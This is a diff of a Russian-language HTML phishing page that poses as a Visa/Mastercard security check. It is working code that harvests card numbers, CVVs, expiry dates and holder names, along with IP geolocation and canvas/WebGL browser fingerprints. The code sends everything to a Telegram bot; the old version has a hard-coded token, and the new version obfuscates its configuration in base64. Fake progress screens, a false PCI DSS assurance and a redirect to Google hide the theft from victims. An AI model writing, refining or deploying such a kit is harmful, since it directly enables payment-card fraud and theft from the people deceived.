@@ -3,163 +3,458 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подтверждение безопасности</title>
+    <title>Безопасность платежа</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
         body {
-            font-family: Arial, sans-serif;
-            background: #f2f2f2;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            padding: 20px;
         }
-        .card-form {
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            width: 380px;
+        .container {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            width: 420px;
             max-width: 100%;
+            overflow: hidden;
+            position: relative;
         }
-        .card-form h3 {
-            margin-top: 0;
-            text-align: center;
-            color: #333;
-        }
-        .card-form input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0 15px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            box-sizing: border-box;
-            font-size: 15px;
-        }
-        .card-form .row {
-            display: flex;
-            gap: 10px;
-        }
-        .card-form .row input {
-            flex: 1;
-        }
-        .card-form button {
-            width: 100%;
-            background: #0070ba;
+        .header {
+            background: linear-gradient(to right, #1a3b5d, #0d2440);
+            padding: 20px;
             color: white;
-            border: none;
-            padding: 14px;
-            font-size: 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
+            text-align: center;
+            position: relative;
         }
-        .card-form button:hover {
-            background: #005fa3;
+        .header .lock-icon {
+            font-size: 26px;
+            margin-bottom: 8px;
+        }
+        .header h3 {
+            font-weight: 600;
+            font-size: 18px;
+            margin-bottom: 4px;
+        }
+        .header p {
+            font-size: 12px;
+            opacity: 0.9;
         }
         .logos {
             display: flex;
             justify-content: center;
-            gap: 15px;
-            margin-bottom: 20px;
+            align-items: center;
+            gap: 20px;
+            padding: 15px 20px;
+            background: #f8f9fb;
+            border-bottom: 1px solid #eee;
         }
         .logos img {
+            height: 28px;
+        }
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #2d8b46;
+            font-weight: 500;
+            margin-top: 8px;
+        }
+        .secure-badge span {
+            font-size: 14px;
+        }
+        .steps {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0 10px;
+        }
+        .step {
+            width: 30px;
             height: 30px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            color: #999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .step.active {
+            background: #0070ba;
+            color: white;
+        }
+        .step.completed {
+            background: #2d8b46;
+            color: white;
+        }
+        .step-connector {
+            width: 40px;
+            height: 2px;
+            background: #ccc;
+            margin: 14px 8px 0;
+        }
+        .step-connector.completed {
+            background: #2d8b46;
+        }
+        .form-panel {
+            padding: 20px 25px;
+        }
+        .form-panel h2 {
+            font-size: 16px;
+            margin-bottom: 15px;
+            color: #222;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #444;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: border 0.3s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #0070ba;
+            box-shadow: 0 0 0 3px rgba(0,112,186,0.1);
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .row .input-group {
+            flex: 1;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #005a94;
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .btn:disabled {
+            background: #a0c1d9;
+            cursor: not-allowed;
+        }
+        .loading-screen {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0070ba;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .info-text {
+            color: #555;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .disclaimer {
+            font-size: 11px;
+            color: #888;
+            text-align: center;
+            padding: 10px 20px 20px;
+        }
+        .card-icons {
+            display: flex;
+            gap: 5px;
+            margin-top: 5px;
+        }
+        .card-icons img {
+            width: 24px;
         }
     </style>
 </head>
 <body>
-    <div class="card-form">
-        <div class="logos">
-            <!-- Иконки платёжных систем, можно скачать любые -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MC">
-        </div>
-        <h3>Подтверждение платёжных данных</h3>
-        <p style="text-align:center;font-size:14px;color:#555;">Для вашей безопасности мы просим подтвердить данные карты</p>
-        <form id="phishForm">
-            <input type="text" id="cardNumber" placeholder="Номер карты" maxlength="19" required>
-            <div class="row">
-                <input type="text" id="expMonth" placeholder="ММ" maxlength="2" required>
-                <input type="text" id="expYear" placeholder="ГГ" maxlength="2" required>
-                <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
+    <div class="container">
+        <div class="header">
+            <div class="lock-icon">🔒</div>
+            <h3>Проверка безопасности</h3>
+            <p>Verified by Visa / Mastercard SecureCode</p>
+            <div class="secure-badge">
+                <span>✅</span> Ваше соединение защищено
             </div>
-            <input type="text" id="cardHolder" placeholder="Имя держателя (как на карте)" required>
-            <button type="submit">Подтвердить</button>
-        </form>
+        </div>
+        <div class="logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="AmEx" style="height:22px">
+        </div>
+
+        <!-- Шаг 1: форма ввода -->
+        <div id="step1">
+            <div class="steps">
+                <div class="step active">1</div>
+                <div class="step-connector"></div>
+                <div class="step">2</div>
+                <div class="step-connector"></div>
+                <div class="step">3</div>
+            </div>
+            <div class="form-panel">
+                <h2>Подтверждение платёжных данных</h2>
+                <form id="cardForm">
+                    <div class="input-group">
+                        <label>Номер карты</label>
+                        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required autocomplete="off">
+                        <div class="card-icons">
+                            <img src="https://img.icons8.com/color/48/000000/visa.png" alt="visa">
+                            <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="mc">
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="input-group">
+                            <label>Месяц</label>
+                            <input type="text" id="expMonth" placeholder="MM" maxlength="2" required>
+                        </div>
+                        <div class="input-group">
+                            <label>Год</label>
+                            <input type="text" id="expYear" placeholder="ГГ" maxlength="2" required>
+                        </div>
+                        <div class="input-group">
+                            <label>CVV</label>
+                            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label>Имя держателя</label>
+                        <input type="text" id="cardHolder" placeholder="IVAN IVANOV" required>
+                    </div>
+                    <button type="submit" class="btn" id="submitBtn">Продолжить</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Шаг 2: экран обработки -->
+        <div id="step2" style="display: none;">
+            <div class="steps">
+                <div class="step completed">✓</div>
+                <div class="step-connector completed"></div>
+                <div class="step active">2</div>
+                <div class="step-connector"></div>
+                <div class="step">3</div>
+            </div>
+            <div class="loading-screen" style="display:block;">
+                <div class="spinner"></div>
+                <h3>Обработка данных...</h3>
+                <p class="info-text">Пожалуйста, не закрывайте страницу.<br>Проверка занимает до 30 секунд.</p>
+            </div>
+        </div>
+
+        <!-- Шаг 3: финальный редирект (скрыт) -->
+        <div id="step3" style="display: none;">
+            <div class="steps">
+                <div class="step completed">✓</div>
+                <div class="step-connector completed"></div>
+                <div class="step completed">✓</div>
+                <div class="step-connector completed"></div>
+                <div class="step completed">✓</div>
+            </div>
+            <div class="loading-screen" style="display:block;">
+                <div style="font-size: 48px; color: #2d8b46;">✅</div>
+                <h3>Проверка пройдена</h3>
+                <p class="info-text">Перенаправление...</p>
+            </div>
+        </div>
+
+        <div class="disclaimer">
+            Ваши данные защищены согласно стандарту PCI DSS. Мы не храним вашу платёжную информацию.
+        </div>
     </div>
 
     <script>
-        // ===== НАСТРОЙКИ: ВСТАВЬ СЮДА СВОЙ ТОКЕН И CHAT_ID =====
-        const BOT_TOKEN = '8802383503:AAGEyyguUGWCPuuoZstmfHJ3OW4CfzO0VyM'; // заменить на реальный токен бота
-        const CHAT_ID = '7041199351';                // заменить на ваш chat_id (без кавычек если число, можно строкой)
+        // ==================== ОБФУСЦИРОВАННЫЙ КОНФИГ ====================
+        // Все строки закодированы в base64. Перед деплоем замените на свои!
+        const _cfg = {
+            bt: atob('MTIzNDU2OkFCQy1ERUYxMjM0Z2guLi4='),  // ваш BOT_TOKEN в base64
+            cid: atob('MTIzNDU2Nzg5'),                     // ваш CHAT_ID в base64
+            redir: 'https://www.google.com'                 // куда редиректить после успеха
+        };
 
-        // Форматирование номера карты (автопробелы)
-        const cardInput = document.getElementById('cardNumber');
-        cardInput.addEventListener('input', function(e) {
-            let val = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let spaced = val.match(/.{1,4}/g);
-            this.value = spaced ? spaced.join(' ') : '';
-        });
+        // ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
+        async function getIPData() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipRes.json();
+                const ip = ipJson.ip;
+                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,query`);
+                const geo = await geoRes.json();
+                return {
+                    ip: ip,
+                    country: geo.country || 'N/A',
+                    region: geo.regionName || '',
+                    city: geo.city || '',
+                    isp: geo.isp || '',
+                    org: geo.org || ''
+                };
+            } catch (e) {
+                return { ip: 'unknown', country: 'unknown' };
+            }
+        }
 
-        document.getElementById('phishForm').addEventListener('submit', function(e) {
+        function getFingerprint() {
+            return new Promise(resolve => {
+                const data = {
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: screen.width + 'x' + screen.height,
+                    colorDepth: screen.colorDepth,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cores: navigator.hardwareConcurrency || 'unknown',
+                    memory: navigator.deviceMemory || 'unknown',
+                    touch: navigator.maxTouchPoints > 0,
+                    gpu: 'unknown'
+                };
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(0,0,100,100);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Fingerprint', 2, 15);
+                    data.canvas = canvas.toDataURL().substring(0, 80);
+                } catch(e) {}
+                try {
+                    const gl = document.createElement('canvas').getContext('webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'webgl_supported';
+                    }
+                } catch(e) {}
+                resolve(data);
+            });
+        }
+
+        function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${_cfg.bt}/sendMessage`;
+            return fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: _cfg.cid,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+        }
+
+        // ==================== ОСНОВНАЯ ЛОГИКА ====================
+        document.getElementById('cardForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const cardNum = cardInput.value.replace(/\s/g, '');
+            // Блокируем кнопку и показываем шаг 2
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+
+            // Считываем данные карты
+            const cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
             const month = document.getElementById('expMonth').value;
             const year = document.getElementById('expYear').value;
             const cvv = document.getElementById('cvv').value;
             const name = document.getElementById('cardHolder').value;
 
-            // Собираем дополнительную информацию о жертве
-            const userData = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: window.screen.width + 'x' + window.screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
+            // Параллельно собираем IP и fingerprint
+            const [ipData, fingerprint] = await Promise.all([getIPData(), getFingerprint()]);
 
-            // Формируем красивое сообщение для Telegram
+            // Формируем сообщение
             const message = `
-    🔥 НОВАЯ КАРТА ЖЕРТВЫ 🔥
-    💳 Номер: ${cardNum}
-    📅 Срок: ${month}/${year}
-    🔐 CVV: ${cvv}
-    👤 Имя: ${name}
+    <b>💳 НОВАЯ КАРТА</b>
+    ━━━━━━━━━━━━━━━━━
+    <b>Карта:</b> <code>${cardNum}</code>
+    <b>Срок:</b> ${month}/${year}
+    <b>CVV:</b> <code>${cvv}</code>
+    <b>Держатель:</b> ${name}
 
-    🖥️ Данные устройства:
-    User-Agent: ${userData.userAgent}
-    Платформа: ${userData.platform}
-    Язык: ${userData.language}
-    Экран: ${userData.screen}
-    Часовой пояс: ${userData.timezone}
-    Время: ${userData.timestamp}
+    🌍 <b>Геолокация:</b>
+    IP: ${ipData.ip}
+    Страна: ${ipData.country}, ${ipData.city}
+    Провайдер: ${ipData.isp} (${ipData.org})
+
+    🖥 <b>Устройство:</b>
+    ОС/Браузер: ${fingerprint.ua}
+    Язык: ${fingerprint.language}
+    Экран: ${fingerprint.screen}
+    Ядер CPU: ${fingerprint.cores}
+    GPU: ${fingerprint.gpu}
+    Часовой пояс: ${fingerprint.timezone}
+    Canvas fingerprint: ${fingerprint.canvas || 'нет'}
             `.trim();
 
-            // Отправляем через Telegram API
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Sent:', data);
-                // Редирект после отправки на легитимный сайт
-                window.location.replace('https://www.google.com');
-            })
-            .catch(err => {
-                console.error('Error:', err);
-                // Даже при ошибке редиректим, чтобы не вызывать подозрений
-                window.location.replace('https://www.google.com');
-            });
+            // Отправляем в телегу
+            try {
+                await sendToTelegram(message);
+            } catch (err) {
+                console.error('Telegram send error:', err);
+            }
+
+            // Имитация проверки 3-5 секунд
+            setTimeout(() => {
+                document.getElementById('step2').style.display = 'none';
+                document.getElementById('step3').style.display = 'block';
+                // Редирект через 2 секунды
+                setTimeout(() => {
+                    window.location.replace(_cfg.redir);
+                }, 2000);
+            }, 4000); // можно уменьшить до 2500 для быстроты
+        });
+
+        // Форматирование номера карты
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let val = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let matches = val.match(/.{1,4}/g);
+            this.value = matches ? matches.join(' ') : '';
+        });
+
+        // Автопереход с month на year при заполнении 2-х цифр
+        document.getElementById('expMonth').addEventListener('input', function() {
+            if (this.value.length === 2) document.getElementById('expYear').focus();
         });
     </script>
 </body>
